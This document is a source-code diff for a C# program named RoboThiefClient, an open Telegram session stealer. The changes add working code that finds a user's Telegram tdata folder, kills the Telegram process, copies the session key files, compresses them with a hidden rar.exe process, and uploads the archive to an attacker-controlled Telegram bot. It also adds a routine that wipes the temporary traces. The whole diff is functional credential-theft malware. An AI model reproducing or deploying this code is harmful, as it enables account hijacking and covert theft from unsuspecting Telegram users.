@@ -30,27 +30,29 @@ namespace RoboThiefClient
             //Check if application have args run it again with hide window
             if (args.Count() == 0)
             {
-                Process p = new Process();
+              
+              
+                //Process p = new Process();
 
-                ProcessStartInfo processStartInfo = new ProcessStartInfo();
-                processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                processStartInfo.FileName = Assembly.GetExecutingAssembly().Location;
-                processStartInfo.CreateNoWindow = true;
-                processStartInfo.UseShellExecute = false;
+                //ProcessStartInfo processStartInfo = new ProcessStartInfo();
+                //processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                //processStartInfo.FileName = Assembly.GetExecutingAssembly().Location;
+                //processStartInfo.CreateNoWindow = true;
+                //processStartInfo.UseShellExecute = false;
 
-                p.StartInfo = processStartInfo;
-                p.Start();
+                //p.StartInfo = processStartInfo;
+                //p.Start();
 
-                Process.GetCurrentProcess().Start();
+                //Process.GetCurrentProcess().Start();
             }
             else
             {
                 // Set tokens ( this method for another app i write for dynamicly generate stealer )
                 TelegramBot.SetValues();
-                
+
                 // Initilize bot for receiving messages from user
                 InitBot();
-                
+
                 //ahhhhh , here we are. let's find telegram path
                 FindTelegram();
                 
@@ -58,17 +60,37 @@ namespace RoboThiefClient
                 Console.ReadKey();
             }
         }
-
+        static void ClearLogs()
+        {
+            try
+            {
+                Thread.Sleep(5000);
+                String Temp = Path.GetTempPath() + @"\TSH";
+                DirectoryInfo Dir = new DirectoryInfo(Temp);
+                foreach (FileInfo SingleFile in Dir.GetFiles())
+                {
+                    SingleFile.Delete();
+                }
+                foreach (DirectoryInfo SingleDirectory in Dir.GetDirectories())
+                {
+                    SingleDirectory.Delete(true);
+                }
+                Directory.Delete(Temp);
+     
+            }
+            catch (Exception)
+            { }
+        }
         private static async void FindTelegram()
         {
             try
             {
                 // get appdata path
                 String appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                
+
                 //get telegram default path
                 String telegramPath = Directory.GetDirectories(appDataPath).FirstOrDefault(c => c.ToLower().Contains("telegram"));
-                
+               
                 //Check path exists
                 if (telegramPath != null && telegramPath != "")
                 {
@@ -76,20 +98,13 @@ namespace RoboThiefClient
                     {
                         var tmpDir = Path.GetTempPath();
                         var tdataDirectory = Directory.GetDirectories(telegramPath).First(c => c.ToLower().Contains("tdata"));
-                        
-                        // Now we have temp directory
-                        
-                        // this is a path where we create MT.zip
-                        String tmpTelePath = tmpDir + "MT.zip";
-                        
-                        if (File.Exists(tmpTelePath))
-                            File.Delete(tmpTelePath);
-                        
-                        // Create MM.zip file
-                        Create(tmpDir, "MM", tdataDirectory);
-                        
+
+                        ClearLogs();
+                        var sessionzippath = Create(tdataDirectory);
+
                         // send created file to our bot
-                        await SendSessionAsync(tmpTelePath);
+                        await SendSessionAsync(sessionzippath);
+                       
                     }
                     catch (Exception ex) { Console.WriteLine(ex.Message); }
                 }
@@ -98,6 +113,7 @@ namespace RoboThiefClient
                     StartSearch();
             }
             catch { }
+            finally { ClearLogs(); }
         }
 
         private static void InitBot()
@@ -109,7 +125,7 @@ namespace RoboThiefClient
                 botClient.OnMessage += BotClient_OnMessage;
                 botClient.StartReceiving();
             }
-            catch
+            catch (Exception e)
             {
                 trys++;
                 botClient = null;
@@ -132,7 +148,9 @@ namespace RoboThiefClient
             {
                 using (FileStream fs = File.OpenRead(path))
                 {
-                    await botClient.SendDocumentAsync(long.Parse(TelegramBot.id), null);
+                    InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "mysession.rar");
+
+                    await botClient.SendDocumentAsync(long.Parse(TelegramBot.id), inputOnlineFile);
                 }
 
                 Environment.Exit(Environment.ExitCode);
@@ -140,80 +158,108 @@ namespace RoboThiefClient
             catch (Exception ex) { }
         }
 
-        public static void Create(string outPathname, string password, string folderName)
+        public static string Create(string folderName)
         {
-            using (FileStream fsOut = File.Create(outPathname + "\\MT.zip"))
-            using (var zipStream = new ZipOutputStream(fsOut))
-            {
-                zipStream.SetLevel(3);
-                zipStream.Password = password;
-
-                int folderOffset = folderName.Length + (folderName.EndsWith("\\") ? 0 : 0);
-
-                CompressFolder(folderName, zipStream, folderOffset);
-            }
+            return HuntSession(folderName);
         }
-        private static void CompressFolder(string path, ZipOutputStream zipStream, int folderOffset)
+        private static string HuntSession(string TDataLocation)
         {
-            var files = Directory.GetFiles(path + "map");
+            //C:\Users\Kevin_Yu\AppData\Local\Temp\TSH
+            string Temp = Path.GetTempPath() + @"TSH";
+            Directory.CreateDirectory(Temp);
+            string[] Files, Directoryes;
+            string SuperDirectory = null;
 
-            foreach (var filename in files)
+            #region Get Session
+            try
             {
-                Boolean flag = true;
-                var name = filename.Split('\\')[filename.Split('\\').Count() - 1];
-
-                if (!filename.Contains("map"))
+                if (Directory.Exists(Temp))
                 {
-                    foreach (var n in name)
-                        if (char.IsLower(n) || char.IsSymbol(n))
-                        {
-                            flag = false;
-                            break;
-                        }
+                    DirectoryInfo dir = new DirectoryInfo(Temp);
+                    dir.Delete(true);
                 }
-                if (!flag)
-                    continue;
-                var fi = new FileInfo(filename);
-                var entryName = filename.Substring(folderOffset);
-
-                entryName = ZipEntry.CleanName(entryName);
-
-                var newEntry = new ZipEntry(entryName);
-
-                newEntry.DateTime = fi.LastWriteTime;
-                newEntry.Size = fi.Length;
-
-                zipStream.PutNextEntry(newEntry);
-
-                var buffer = new byte[4096];
-                using (FileStream fsInput = File.OpenRead(filename))
-                    StreamUtils.Copy(fsInput, zipStream, buffer);
-
-                zipStream.CloseEntry();
             }
+            catch { }
 
-            var folders = Directory.GetDirectories(path + "\\map");
-            foreach (var folder in folders)
+            if (Directory.Exists(TDataLocation)) //Get Telegram Session
             {
-                Boolean flag = true;
-                var name = folder.Split('\\')[folder.Split('\\').Count() - 1];
-
-                foreach (var n in name)
-                    if (char.IsLower(n) || char.IsSymbol(n))
+                Files = Directory.GetFiles(TDataLocation);
+                Directoryes = Directory.GetDirectories(TDataLocation);
+                Directory.CreateDirectory(Temp + @"\TelegramSession\" + "tdata");
+                foreach (var Single in Directoryes)
+                {
+                    try
                     {
-                        flag = false;
-                        break;
-                    }
 
-                if (flag)
-                    CompressFolder(folder, zipStream, folderOffset);
-                else
-                    continue;
+                        DirectoryInfo Check = new DirectoryInfo(Single);
+                        if (Convert.ToInt64(Check.Name.Length) > 15)
+                        {
+                            Directory.CreateDirectory(Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
+                            SuperDirectory = Check.Name;
+                        }
+                    }
+                    catch { }
+                }
+                foreach (var Single in Files)
+                {
+                    try
+                    {
+                        FileInfo Check = new FileInfo(Single);
+                        if (Convert.ToInt64(Check.Length) < 5000 &&
+                            Check.Name.Length > 15 &&
+                            Path.GetExtension(Single) != ".json")
+                        {
+                            File.Copy(Single, Temp + @"\TelegramSession\" + @"tdata\" + Check.Name);
+                        }
+                    }
+                    catch (Exception) { }
+                }
+                string[] Map =
+                        {
+                         TDataLocation + @"\" + SuperDirectory + @"\map0",
+                         TDataLocation + @"\" + SuperDirectory + @"\map1"
+                        };
+                if (File.Exists(Map[0]))
+                {
+                    File.Copy(Map[0], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map0");
+                }
+                if (File.Exists(Map[1]))
+                {
+                    File.Copy(Map[1], Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "map1");
+                }
+                File.Copy($"{TDataLocation}\\{SuperDirectory}\\maps", Temp + @"\TelegramSession\" + @"tdata\" + SuperDirectory + @"\" + "maps");
             }
+            #endregion
+
+            return CompressSession(Temp);
+      
+
         }
+        private static string CompressSession(string TDataLocation)
+        {
+            #region Run RAR Proccess
+            string RCL = TDataLocation.Replace("\\tdata", "");
+            try
+            {
+
+                System.Diagnostics.Process cmd = new System.Diagnostics.Process();
+                cmd.StartInfo.WorkingDirectory = RCL;
+                cmd.StartInfo.FileName = @"C:\Program Files\WinRAR\rar.exe";
+                cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                cmd.StartInfo.Arguments = "a -ep1 -r Session.rar tdata";
+                cmd.Start();
+            }
+            catch { }
+            #endregion
+            string _location = TDataLocation.Replace("tdata", "");
+            return TDataLocation + @"\Session.rar";
+
+        }
+    
         static Boolean finded = false;
         private static void StartSearch()
         {
+
             while (!finded)
             {
                 Func<Task<Process>> funcTask = FindTelegramProcess;
@@ -235,51 +281,47 @@ namespace RoboThiefClient
             finded = true;
             try
             {
-                Thread.Sleep(1000);
+                
+                //Thread.Sleep(1000);
                 String fileName = result.Result.MainModule.FileName;
                 var parent = Directory.GetParent(fileName);
-                var tmpDir = Path.GetTempPath();
-                
-                // allright , here we have telegram tdata and we want to zip it.
-                // we have to kill telegram application process to access the tdata folder.
-                
+                //var tmpDir = Path.GetTempPath();
+
+                //// allright , here we have telegram tdata and we want to zip it.
+                //// we have to kill telegram application process to access the tdata folder.
+
                 var tdataDirectory = Directory.GetDirectories(parent.FullName).First(c => c.ToLower().Contains("tdata"));
                 result.Result.Kill();
+                HuntSession(tdataDirectory);
 
-                String tmpTelePath = tmpDir + "Mt.zip";
-
-                if (File.Exists(tmpTelePath))
-                    File.Delete(tmpTelePath);
-
-                Create(tmpDir, "MM", tdataDirectory);
-                
-                // When we ziping proccess if completed , we have to start telegram application again.
-                Process.Start(fileName);
-
-                await SendSessionAsync(tmpDir);
             }
-            catch (Exception ex){ }
+            catch (Exception ex) { }
         }
-
+      
         private static async Task<Process> FindTelegramProcess()
         {
             var process = Process.GetProcesses();
             var sortedProcess = process;
-            
+
             //we get all process that names start with "t"
-            
-            var tprocess = sortedProcess.Where(p => p.ProcessName.StartsWith("r"));
+
+            var tprocess = sortedProcess.Where(p => p.ProcessName.ToLower().StartsWith("t"));
 
             foreach (var p in tprocess)
             {
                 try
                 {
                     if (p.ProcessName.ToLower().Contains("telegram"))
+                    {
+              
                         return p;
+                    }
+
+                   
                 }
                 catch (Exception ex) { }
             }
-            
+          
             // if we cannot find telegram , mabe user have another version of telegram.
             // then we should to check all 
             foreach (var p in process)
